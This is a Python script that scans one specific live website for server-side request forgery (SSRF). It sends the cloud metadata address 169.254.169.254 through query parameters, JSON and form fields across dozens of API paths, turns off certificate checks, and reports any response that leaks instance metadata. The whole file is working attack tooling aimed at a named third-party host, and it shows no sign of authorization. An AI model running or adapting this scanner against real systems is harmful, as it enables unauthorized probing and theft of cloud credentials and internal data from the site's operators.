#!/usr/bin/env python3
"""
SSRF Endpoint Discovery Script
Test all API endpoints with SSRF payloads
"""

import requests
import json
from urllib.parse import urljoin

BASE_URL = "https://skillmoney.8unb.xyz"
SSRF_PAYLOAD = "http://169.254.169.254/latest/meta-data/"
TIMEOUT = 5

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

# Common API endpoints to test
ENDPOINTS = [
    # GET endpoints
    ("GET", "/api"),
    ("GET", "/api/"),
    ("GET", "/api/leaderboard"),
    ("GET", "/api/profile"),
    ("GET", "/api/auth"),
    ("GET", "/api/user"),
    ("GET", "/api/data"),
    ("GET", "/api/fetch"),
    ("GET", "/api/proxy"),
    ("GET", "/api/request"),
    ("GET", "/api/url"),
    ("GET", "/api/image"),
    ("GET", "/api/download"),
    ("GET", "/api/webhook"),
    ("GET", "/api/callback"),
    
    # POST endpoints
    ("POST", "/api/fetch"),
    ("POST", "/api/proxy"),
    ("POST", "/api/request"),
    ("POST", "/api/url"),
    ("POST", "/api/image"),
    ("POST", "/api/download"),
    ("POST", "/api/webhook"),
    ("POST", "/api/callback"),
    ("POST", "/api/upload"),
    ("POST", "/api/process"),
]

# Parameter names to test
PARAM_NAMES = [
    "url",
    "link",
    "uri",
    "endpoint",
    "target",
    "resource",
    "fetch",
    "proxy",
    "redirect",
    "request",
    "image",
    "file",
    "path",
]

def test_get_with_params(endpoint):
    """Test GET endpoints with URL parameters"""
    print(f"\n[*] Testing GET {endpoint} with URL parameters...")
    
    for param in PARAM_NAMES:
        test_url = f"{BASE_URL}{endpoint}?{param}={SSRF_PAYLOAD}"
        
        try:
            response = requests.get(test_url, timeout=TIMEOUT, verify=False)
            
            # Check if response contains metadata indicators
            if response.status_code == 200:
                if any(indicator in response.text for indicator in [
                    "instance-id",
                    "ami-id",
                    "local-ipv4",
                    "instance-type",
                    "latest",
                    "meta-data"
                ]):
                    print(f"  ✅ FOUND SSRF! Parameter: {param}")
                    print(f"     Status: {response.status_code}")
                    print(f"     Response Preview: {response.text[:200]}")
                    return True
                else:
                    print(f"  [+] Status 200, but no metadata indicators")
            elif response.status_code == 404:
                pass  # Endpoint doesn't exist
            else:
                print(f"  [-] Status: {response.status_code}")
                
        except Exception as e:
            pass

def test_post_with_json(endpoint):
    """Test POST endpoints with JSON payloads"""
    print(f"\n[*] Testing POST {endpoint} with JSON payload...")
    
    for param in PARAM_NAMES:
        data = {param: SSRF_PAYLOAD}
        
        try:
            response = requests.post(
                f"{BASE_URL}{endpoint}",
                json=data,
                timeout=TIMEOUT,
                verify=False,
                headers={"Content-Type": "application/json"}
            )
            
            if response.status_code == 200:
                if any(indicator in response.text for indicator in [
                    "instance-id",
                    "ami-id",
                    "local-ipv4",
                    "instance-type",
                    "latest",
                    "meta-data"
                ]):
                    print(f"  ✅ FOUND SSRF! Parameter: {param}")
                    print(f"     Status: {response.status_code}")
                    print(f"     Response Preview: {response.text[:200]}")
                    return True
                else:
                    print(f"  [+] Status 200, but no metadata indicators")
            
        except Exception as e:
            pass

def test_post_with_form(endpoint):
    """Test POST endpoints with form data"""
    print(f"\n[*] Testing POST {endpoint} with form data...")
    
    for param in PARAM_NAMES:
        data = {param: SSRF_PAYLOAD}
        
        try:
            response = requests.post(
                f"{BASE_URL}{endpoint}",
                data=data,
                timeout=TIMEOUT,
                verify=False
            )
            
            if response.status_code == 200:
                if any(indicator in response.text for indicator in [
                    "instance-id",
                    "ami-id",
                    "local-ipv4",
                    "instance-type",
                    "latest",
                    "meta-data"
                ]):
                    print(f"  ✅ FOUND SSRF! Parameter: {param}")
                    print(f"     Status: {response.status_code}")
                    print(f"     Response Preview: {response.text[:200]}")
                    return True
            
        except Exception as e:
            pass

def main():
    print("=" * 80)
    print("SSRF ENDPOINT DISCOVERY SCRIPT")
    print("Target: https://skillmoney.8unb.xyz")
    print("=" * 80)
    
    found_ssrf = False
    
    for method, endpoint in ENDPOINTS:
        try:
            if method == "GET":
                if test_get_with_params(endpoint):
                    found_ssrf = True
            elif method == "POST":
                if test_post_with_json(endpoint):
                    found_ssrf = True
                if test_post_with_form(endpoint):
                    found_ssrf = True
        except Exception as e:
            print(f"Error testing {method} {endpoint}: {e}")
    
    print("\n" + "=" * 80)
    if found_ssrf:
        print("✅ SSRF ENDPOINT FOUND!")
    else:
        print("❌ NO SSRF ENDPOINT FOUND IN TESTED PATHS")
    print("=" * 80)

if __name__ == "__main__":
    main()
